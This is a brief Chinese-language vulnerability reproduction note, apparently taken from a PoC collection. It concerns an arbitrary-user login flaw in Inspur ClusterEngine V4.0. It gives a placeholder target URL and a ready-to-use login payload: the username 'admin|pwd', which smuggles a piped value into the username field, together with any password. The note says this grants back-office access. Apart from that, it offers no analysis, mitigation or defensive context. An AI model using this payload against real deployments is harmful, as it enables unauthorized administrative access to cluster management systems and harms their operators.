漏洞描述:

浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限

漏洞影响:

浪潮ClusterEngineV4.0

漏洞复现:

访问漏洞url：

*   

```
`https://xxx.xxx.xxx.xxx/`
```

登录页面如下:

![](../Images/a9c4e76ff1692524591f81d58d2c1e72.png)

构造payload：

*   
*   

```
`username：admin|pwd``password:  任意`
```
